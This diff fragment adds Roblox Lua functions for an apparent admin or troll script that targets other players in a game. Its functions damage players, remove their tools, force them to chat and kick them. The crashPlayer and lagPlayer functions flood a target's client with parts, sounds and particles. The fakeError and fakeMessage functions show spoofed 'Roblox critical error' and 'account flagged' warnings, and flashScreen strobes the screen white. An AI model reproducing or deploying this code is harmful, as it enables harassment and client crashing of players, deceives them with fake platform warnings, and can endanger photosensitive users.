+                if part:IsA("BasePart") and (part.Name:find("Hand") or part.Name:find("Arm") or part.Name:find("Grip")) then
+                    part:Destroy()
+                end
+            end
+            for _, item in ipairs(plr.Character:GetChildren()) do
+                if item:IsA("Tool") then item:Destroy() end
+            end
+        end
+    end
+end
+
+local function annoy(targets, times)
+    times = times or 20
+    for _, plr in ipairs(targets) do
+        if plr.Character then
+            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
+            if hum then
+                spawn(function()
+                    for i = 1, times do
+                        if not hum or hum.Health <= 0 then break end
+                        hum:TakeDamage(5)
+                        task.wait(0.3)
+                    end
+                end)
+            end
+        end
+    end
+end
+
+local function backflip(targets, speed)
+    speed = speed or 1
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character.PrimaryPart then
+            local id = "backflip_"..plr.Name
+            activeLoops[id] = true
+            spawn(function()
+                while activeLoops[id] do
+                    if not plr.Character or not plr.Character.PrimaryPart then break end
+                    plr.Character:SetPrimaryPartCFrame(
+                        plr.Character.PrimaryPart.CFrame * CFrame.Angles(math.rad(10 * speed), 0, 0)
+                    )
+                    task.wait(0.05)
+                end
+            end)
+        end
+    end
+end
+
+local function addTrail(targets, color)
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character:FindFirstChild("Torso") then
+            local att0 = Instance.new("Attachment")
+            att0.Position = Vector3.new(0, 1, 0)
+            att0.Parent = plr.Character.Torso
+            local att1 = Instance.new("Attachment")
+            att1.Position = Vector3.new(0, -1, 0)
+            att1.Parent = plr.Character.Torso
+
+            local trail = Instance.new("Trail")
+            trail.Attachment0 = att0
+            trail.Attachment1 = att1
+            trail.Lifetime = 2
+            local c = Color3.new(1, 1, 0)
+            if color == "red" then c = Color3.new(1, 0, 0)
+            elseif color == "blue" then c = Color3.new(0, 0, 1)
+            elseif color == "green" then c = Color3.new(0, 1, 0)
+            elseif color == "purple" then c = Color3.new(1, 0, 1)
+            elseif color == "cyan" then c = Color3.new(0, 1, 1)
+            end
+            trail.Color = ColorSequence.new(c)
+            trail.Name = "OwnerTrail"
+            trail.Parent = plr.Character.Torso
+        end
+    end
+end
+
+local function removeTrail(targets)
+    for _, plr in ipairs(targets) do
+        if plr.Character then
+            for _, t in ipairs(plr.Character:GetDescendants()) do
+                if t:IsA("Trail") and t.Name == "OwnerTrail" then t:Destroy() end
+            end
+        end
+    end
+end
+
+local function addParticles(targets, style)
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character.PrimaryPart then
+            local p = Instance.new("ParticleEmitter")
+            p.Texture = "rbxassetid://241594186"
+            p.Rate = 100
+            p.Lifetime = NumberRange.new(2)
+            p.Speed = NumberRange.new(5)
+            p.Name = "OwnerParticles"
+            p.Parent = plr.Character.PrimaryPart
+        end
+    end
+end
+
+local function removeParticles(targets)
+    for _, plr in ipairs(targets) do
+        if plr.Character then
+            for _, p in ipairs(plr.Character:GetDescendants()) do
+                if p.Name == "OwnerParticles" then p:Destroy() end
+            end
+        end
+    end
+end
+
+local function playMusic(targets, soundId)
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character:FindFirstChild("Head") then
+            for _, s in ipairs(plr.Character.Head:GetChildren()) do
+                if s:IsA("Sound") and s.Name == "OwnerMusic" then s:Destroy() end
+            end
+            local sound = Instance.new("Sound")
+            sound.Name = "OwnerMusic"
+            sound.SoundId = "rbxassetid://" .. (soundId or "1846853813")
+            sound.Volume = 5
+            sound.Looped = true
+            sound.Parent = plr.Character.Head
+            sound:Play()
+        end
+    end
+end
+
+local function stopMusic(targets)
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character:FindFirstChild("Head") then
+            for _, s in ipairs(plr.Character.Head:GetChildren()) do
+                if s:IsA("Sound") and s.Name == "OwnerMusic" then s:Destroy() end
+            end
+        end
+    end
+end
+
+local function forceChat(targets, message)
+    for _, plr in ipairs(targets) do
+        if plr.Character then
+            pcall(function()
+                game:GetService("Chat"):Chat(plr.Character, message or "I love owner", Enum.ChatColor.White)
+            end)
+        end
+    end
+end
+
+local function crashPlayer(targets, level)
+    level = level or 3
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character.PrimaryPart then
+            spawn(function()
+                -- สร้าง part เยอะมากๆ ใกล้ผู้เล่น
+                for i = 1, level * 100 do
+                    local p = Instance.new("Part")
+                    p.Size = Vector3.new(1, 1, 1)
+                    p.Position = plr.Character.PrimaryPart.Position + Vector3.new(
+                        math.random(-20, 20),
+                        math.random(-20, 20),
+                        math.random(-20, 20)
+                    )
+                    p.Anchored = false
+                    p.CanCollide = false
+                    p.Parent = workspace
+                end
+                -- สร้าง sound เยอะๆ
+                for i = 1, level * 50 do
+                    local s = Instance.new("Sound")
+                    s.SoundId = "rbxassetid://1846853813"
+                    s.Volume = 10
+                    s.Looped = true
+                    s.Parent = plr.Character.Head
+                    s:Play()
+                end
+                -- สร้าง particle เยอะๆ
+                for i = 1, level * 50 do
+                    local pe = Instance.new("ParticleEmitter")
+                    pe.Rate = 99999
+                    pe.Parent = plr.Character.Head
+                end
+            end)
+        end
+    end
+end
+
+local function controlPlayer(targets)
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character.PrimaryPart then
+            local id = "control_"..plr.Name
+            activeLoops[id] = true
+            spawn(function()
+                while activeLoops[id] do
+                    if not plr.Character or not plr.Character.PrimaryPart then break end
+                    plr.Character:Move(Vector3.new(0, 0, -10), false)
+                    task.wait(0.1)
+                end
+            end)
+        end
+    end
+end
+
+local function shakeScreen(targets, intensity)
+    intensity = intensity or 1
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character.PrimaryPart then
+            local id = "shake_"..plr.Name
+            activeLoops[id] = true
+            spawn(function()
+                while activeLoops[id] do
+                    if not plr.Character or not plr.Character:FindFirstChild("HumanoidRootPart") then break end
+                    local hrp = plr.Character.HumanoidRootPart
+                    hrp.CFrame = hrp.CFrame * CFrame.new(
+                        math.random(-intensity, intensity),
+                        math.random(-intensity, intensity),
+                        math.random(-intensity, intensity)
+                    )
+                    task.wait(0.05)
+                end
+            end)
+        end
+    end
+end
+
+local function changeSkybox(targets, skyId)
+    for _, plr in ipairs(targets) do
+        spawn(function()
+            local sky = workspace:FindFirstChildOfClass("Sky")
+            if not sky then
+                sky = Instance.new("Sky")
+                sky.Parent = workspace
+            end
+            local id = "rbxassetid://" .. (skyId or "6444884336")
+            sky.SkyboxBk = id
+            sky.SkyboxDn = id
+            sky.SkyboxFt = id
+            sky.SkyboxLf = id
+            sky.SkyboxRt = id
+            sky.SkyboxUp = id
+        end)
+    end
+end
+
+local function restoreSkybox()
+    local sky = workspace:FindFirstChildOfClass("Sky")
+    if sky then sky:Destroy() end
+end
+
+local function changeWalkSpeed(targets, speed)
+    for _, plr in ipairs(targets) do
+        if plr.Character then
+            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
+            if hum then hum.WalkSpeed = speed or 16 end
+        end
+    end
+end
+
+local function changeJumpPower(targets, power)
+    for _, plr in ipairs(targets) do
+        if plr.Character then
+            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
+            if hum then hum.JumpPower = power or 50 end
+        end
+    end
+end
+
+local function resizePlayer(targets, scale)
+    scale = scale or 2
+    for _, plr in ipairs(targets) do
+        if plr.Character then
+            for _, part in ipairs(plr.Character:GetChildren()) do
+                if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                    part.Size = part.Size * scale
+                end
+            end
+        end
+    end
+end
+
+local function resizeHead(targets, size)
+    size = size or 5
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character:FindFirstChild("Head") then
+            plr.Character.Head.Size = Vector3.new(size, size, size)
+        end
+    end
+end
+
+local function bouncePlayer(targets, power)
+    power = power or 100
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character.PrimaryPart then
+            local id = "bounce_"..plr.Name
+            activeLoops[id] = true
+            spawn(function()
+                while activeLoops[id] do
+                    if not plr.Character or not plr.Character.PrimaryPart then break end
+                    plr.Character:SetPrimaryPartCFrame(
+                        plr.Character.PrimaryPart.CFrame + Vector3.new(0, power/10, 0)
+                    )
+                    task.wait(0.1)
+                end
+            end)
+        end
+    end
+end
+
+local function rainParts(targets, type)
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character.PrimaryPart then
+            spawn(function()
+                for i = 1, 100 do
+                    local p = Instance.new("Part")
+                    if type == "fire" then
+                        p.Size = Vector3.new(1, 1, 1)
+                        p.BrickColor = BrickColor.new("Really red")
+                        local f = Instance.new("Fire")
+                        f.Size = 10
+                        f.Parent = p
+                    elseif type == "ice" then
+                        p.Size = Vector3.new(1, 1, 1)
+                        p.BrickColor = BrickColor.new("Cyan")
+                        p.Material = Enum.Material.SmoothPlastic
+                    elseif type == "rock" then
+                        p.Size = Vector3.new(2, 2, 2)
+                        p.BrickColor = BrickColor.new("Dark stone grey")
+                    else
+                        p.Size = Vector3.new(1, 1, 1)
+                    end
+                    p.Anchored = false
+                    p.CanCollide = true
+                    p.Position = plr.Character.PrimaryPart.Position + Vector3.new(
+                        math.random(-20, 20), 30, math.random(-20, 20)
+                    )
+                    p.Parent = workspace
+                    task.wait(0.05)
+                end
+            end)
+        end
+    end
+end
+
+local function blackHole(targets, power)
+    power = power or 50
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character.PrimaryPart then
+            local id = "blackhole_"..plr.Name
+            activeLoops[id] = true
+            spawn(function()
+                while activeLoops[id] do
+                    if not plr.Character or not plr.Character.PrimaryPart then break end
+                    local hrp = plr.Character.HumanoidRootPart
+                    hrp.CFrame = hrp.CFrame * CFrame.new(0, -power/100, 0)
+                    task.wait(0.05)
+                end
+            end)
+        end
+    end
+end
+
+local function discoMode(targets, speed)
+    speed = speed or 1
+    for _, plr in ipairs(targets) do
+        if plr.Character then
+            local id = "disco_"..plr.Name
+            activeLoops[id] = true
+            spawn(function()
+                while activeLoops[id] do
+                    if not plr.Character then break end
+                    local lighting = game:GetService("Lighting")
+                    lighting.Ambient = Color3.fromHSV(tick() % 1, 1, 1)
+                    lighting.FogEnd = 100 + math.sin(tick() * speed * 2) * 50
+                    task.wait(0.05)
+                end
+            end)
+        end
+    end
+end
+
+local function earthquake(targets, power)
+    power = power or 5
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character.PrimaryPart then
+            local id = "earthquake_"..plr.Name
+            activeLoops[id] = true
+            spawn(function()
+                while activeLoops[id] do
+                    if not plr.Character or not plr.Character.PrimaryPart then break end
+                    plr.Character:SetPrimaryPartCFrame(
+                        plr.Character.PrimaryPart.CFrame + Vector3.new(
+                            math.random(-power, power),
+                            math.random(-power, power),
+                            math.random(-power, power)
+                        )
+                    )
+                    task.wait(0.05)
+                end
+            end)
+        end
+    end
+end
+
+local function lagPlayer(targets, level)
+    level = level or 5
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character.PrimaryPart then
+            spawn(function()
+                for i = 1, level * 200 do
+                    local p = Instance.new("Part")
+                    p.Size = Vector3.new(1, 1, 1)
+                    p.Anchored = true
+                    p.CanCollide = false
+                    p.Transparency = 1
+                    p.Position = plr.Character.PrimaryPart.Position
+                    p.Parent = workspace
+                end
+            end)
+        end
+    end
+end
+
+local function tpBack(plr)
+    if plr.Character and plr.Character.PrimaryPart then
+        if savedPositions[plr.Name] then
+            plr.Character:SetPrimaryPartCFrame(savedPositions[plr.Name])
+        end
+    end
+end
+
+local function fakeError(targets)
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character:FindFirstChild("Head") then
+            local gui = Instance.new("ScreenGui")
+            gui.Parent = plr:FindFirstChildOfClass("PlayerGui") or game:GetService("CoreGui")
+            local frame = Instance.new("Frame")
+            frame.Size = UDim2.new(1, 0, 1, 0)
+            frame.BackgroundColor3 = Color3.new(1, 0, 0)
+            frame.BackgroundTransparency = 0.3
+            frame.Parent = gui
+            local text = Instance.new("TextLabel")
+            text.Size = UDim2.new(0.8, 0, 0.2, 0)
+            text.Position = UDim2.new(0.1, 0, 0.4, 0)
+            text.BackgroundTransparency = 1
+            text.TextColor3 = Color3.new(1, 1, 1)
+            text.TextScaled = true
+            text.Font = Enum.Font.GothamBold
+            text.Text = "⚠️ ROBLOX CRITICAL ERROR ⚠️\nAccount will be deleted in 5..."
+            text.Parent = frame
+            task.delay(5, function() gui:Destroy() end)
+        end
+    end
+end
+
+local function rejoinPlayer(targets)
+    for _, plr in ipairs(targets) do
+        if plr ~= localPlayer then
+            pcall(function() plr:Kick("Rejoining...") end)
+        end
+    end
+end
+
+local function fakeMessage(targets, message)
+    for _, plr in ipairs(targets) do
+        spawn(function()
+            pcall(function()
+                game:GetService("StarterGui"):SetCore("SendNotification", {
+                    Title = "Roblox System",
+                    Text = message or "Your account has been flagged!",
+                    Duration = 10
+                })
+            end)
+        end)
+    end
+end
+
+local function dizzy(targets, power)
+    power = power or 20
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character.PrimaryPart then
+            local id = "dizzy_"..plr.Name
+            activeLoops[id] = true
+            spawn(function()
+                while activeLoops[id] do
+                    if not plr.Character or not plr.Character.PrimaryPart then break end
+                    plr.Character:SetPrimaryPartCFrame(
+                        plr.Character.PrimaryPart.CFrame * CFrame.Angles(0, math.rad(power), 0)
+                    )
+                    task.wait(0.03)
+                end
+            end)
+        end
+    end
+end
+
+local function nuke(targets)
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character.PrimaryPart then
+            for i = 1, 10 do
+                local e = Instance.new("Explosion", workspace)
+                e.Position = plr.Character.PrimaryPart.Position + Vector3.new(math.random(-10,10), 0, math.random(-10,10))
+                e.BlastRadius = 30
+            end
+        end
+    end
+end
+
+local function rocketPlayer(targets)
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character.PrimaryPart then
+            spawn(function()
+                local fire = Instance.new("Fire")
+                fire.Size = 30
+                fire.Parent = plr.Character.PrimaryPart
+                local bv = Instance.new("BodyVelocity")
+                bv.Velocity = Vector3.new(0, 300, 0)
+                bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+                bv.Parent = plr.Character.PrimaryPart
+                task.wait(3)
+                bv:Destroy()
+                fire:Destroy()
+                plr.Character:BreakJoints()
+            end)
+        end
+    end
+end
+
+local function flashScreen(targets, power)
+    power = power or 5
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character:FindFirstChild("Head") then
+            spawn(function()
+                local pl = plr
+                local gui = pl:FindFirstChildOfClass("PlayerGui")
+                if not gui then return end
+                for i = 1, power do
+                    local frame = Instance.new("Frame")
+                    frame.Size = UDim2.new(1, 0, 1, 0)
+                    frame.BackgroundColor3 = Color3.new(1, 1, 1)
+                    frame.BackgroundTransparency = 0
+                    frame.Parent = gui
+                    task.wait(0.1)
+                    frame:Destroy()
+                    task.wait(0.1)
+                end
+            end)
+        end
+    end
+end
 
 task.wait(0.3)
 
